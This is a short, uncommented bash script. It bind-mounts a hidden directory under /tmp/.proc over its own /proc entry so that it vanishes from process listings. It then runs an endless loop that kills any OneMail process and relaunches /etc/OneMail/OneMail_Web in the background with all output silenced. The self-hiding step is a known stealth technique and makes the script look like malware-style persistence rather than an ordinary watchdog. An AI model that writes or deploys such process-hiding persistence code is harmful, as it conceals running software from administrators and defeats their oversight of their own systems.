#!/bin/bash

mkdir -p "/tmp/.proc/$$"
mount -o bind "/tmp/.proc/$$" "/proc/$$"

while true; do
  pid=`ps -C OneMail -o pid= 2>/dev/null`
  [ -n "$pid" ] && kill -9 "$pid" && sleep 120
  bash /etc/OneMail/OneMail_Web >/dev/null 2>&1 &
	sleep 60
done





